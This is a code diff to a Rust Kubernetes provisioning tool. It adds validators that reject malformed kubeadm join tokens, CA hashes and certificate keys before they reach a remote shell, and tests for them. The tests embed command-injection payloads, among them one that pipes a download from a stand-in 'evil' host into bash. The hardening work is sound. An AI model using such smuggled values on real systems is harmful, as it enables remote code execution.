@@ -2373,6 +2373,56 @@ struct JoinInfo {
     certificate_key: Option<String>,
 }
 
+/// kubeadm bootstrap token: `[a-z0-9]{6}.[a-z0-9]{16}`.
+fn valid_kubeadm_token(s: &str) -> bool {
+    let ok = |p: &str, n: usize| {
+        p.len() == n
+            && p.bytes()
+                .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit())
+    };
+    s.split_once('.')
+        .is_some_and(|(a, b)| ok(a, 6) && ok(b, 16))
+}
+
+/// `sha256:` followed by 64 hex digits.
+fn valid_ca_cert_hash(s: &str) -> bool {
+    s.strip_prefix("sha256:")
+        .is_some_and(|h| h.len() == 64 && h.bytes().all(|b| b.is_ascii_hexdigit()))
+}
+
+/// Certificate key: 64 hex digits.
+fn valid_certificate_key(s: &str) -> bool {
+    s.len() == 64 && s.bytes().all(|b| b.is_ascii_hexdigit())
+}
+
+impl JoinInfo {
+    /// These three values are scraped from the OUTPUT of `kubeadm` running on a
+    /// remote control-plane and later interpolated into a `sudo -n bash -c`
+    /// on every OTHER node. `shell_quote` only protects the ssh→bash boundary,
+    /// never the content, so a compromised cp1 could smuggle `$(...)` in any of
+    /// them (whitespace-splitting does not stop that). They have fixed formats:
+    /// anything else is refused here, before it can reach a shell.
+    fn check(self) -> Result<Self> {
+        let bad = |what: &str| {
+            Error::Invalid(format!(
+                "kubeadm returned a {what} in an unexpected format — refusing to use it in a remote command"
+            ))
+        };
+        if !valid_kubeadm_token(&self.token) {
+            return Err(bad("join token"));
+        }
+        if !valid_ca_cert_hash(&self.ca_cert_hash) {
+            return Err(bad("CA certificate hash"));
+        }
+        if let Some(k) = &self.certificate_key {
+            if !valid_certificate_key(k) {
+                return Err(bad("certificate key"));
+            }
+        }
+        Ok(self)
+    }
+}
+
 fn kubeadm_init(
     cp1: &SshTarget,
     label: &str,
@@ -2449,11 +2499,12 @@ fn recover_join_info(cp1: &SshTarget) -> Result<JoinInfo> {
         // alternative format (single line "certificate key: <hex>") depending on the version.
         extract_after(&cert_key_out, "certificate key:")
     });
-    Ok(JoinInfo {
+    JoinInfo {
         token,
         ca_cert_hash,
         certificate_key,
-    })
+    }
+    .check()
 }
 
 /// Extracts from the kubeadm init/join output: `token`/`discovery-token-ca-cert-hash`
@@ -2475,11 +2526,12 @@ fn parse_join_info(output: &str) -> Result<JoinInfo> {
             )
         })?;
     let certificate_key = extract_after(output, "--certificate-key ");
-    Ok(JoinInfo {
+    JoinInfo {
         token,
         ca_cert_hash,
         certificate_key,
-    })
+    }
+    .check()
 }
 
 fn extract_after(text: &str, marker: &str) -> Option<String> {
@@ -2517,6 +2569,12 @@ fn kubeadm_join(
     if remote::ssh_check(target, "test -f /etc/kubernetes/kubelet.conf") {
         return Ok(());
     }
+    // Last hop before the shell: re-check even though the constructors did.
+    if !valid_kubeadm_token(&info.token) || !valid_ca_cert_hash(&info.ca_cert_hash) {
+        return Err(Error::Invalid(format!(
+            "[{label}] refusing to run kubeadm join with a malformed token/hash"
+        )));
+    }
     let endpoint = endpoint_with_default_port(endpoint, 6443);
     let mut cmd = format!(
         "kubeadm join {endpoint} --token {} --discovery-token-ca-cert-hash {} \
@@ -2530,6 +2588,11 @@ fn kubeadm_join(
                 super::po::t("no certificate-key available for a control-plane join")
             ))
         })?;
+        if !valid_certificate_key(key) {
+            return Err(Error::Invalid(format!(
+                "[{label}] refusing to run kubeadm join with a malformed certificate key"
+            )));
+        }
         cmd.push_str(&format!(" --control-plane --certificate-key {key}"));
     }
     remote::ssh_run(target, &cmd)
@@ -3533,6 +3596,33 @@ kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
             info.certificate_key.as_deref(),
             Some("2222222222222222222222222222222222222222222222222222222222222222")
         );
+    }
+
+    #[test]
+    fn join_info_rejects_shell_injection_from_remote_output() {
+        let evil_token = "abcdef.0123456789abcdef$(curl${IFS}evil|bash)";
+        let out = SAMPLE_KUBEADM_INIT_OUTPUT.replace("abcdef.0123456789abcdef", evil_token);
+        assert!(parse_join_info(&out).is_err());
+        let evil_hash = SAMPLE_KUBEADM_INIT_OUTPUT.replace(
+            "sha256:1111111111111111111111111111111111111111111111111111111111111111",
+            "sha256:`id`",
+        );
+        assert!(parse_join_info(&evil_hash).is_err());
+        let evil_key = SAMPLE_KUBEADM_INIT_OUTPUT.replace(
+            "2222222222222222222222222222222222222222222222222222222222222222",
+            ";id",
+        );
+        assert!(parse_join_info(&evil_key).is_err());
+    }
+
+    #[test]
+    fn kubeadm_formats_are_strict() {
+        assert!(valid_kubeadm_token("abcdef.0123456789abcdef"));
+        assert!(!valid_kubeadm_token("ABCDEF.0123456789abcdef"));
+        assert!(!valid_kubeadm_token("abcdef.0123456789abcde"));
+        assert!(!valid_ca_cert_hash("sha256:abc"));
+        assert!(!valid_certificate_key(&"g".repeat(64)));
+        assert!(valid_certificate_key(&"a".repeat(64)));
     }
 
     fn etcd_host(ip: &str) -> HostSpec {
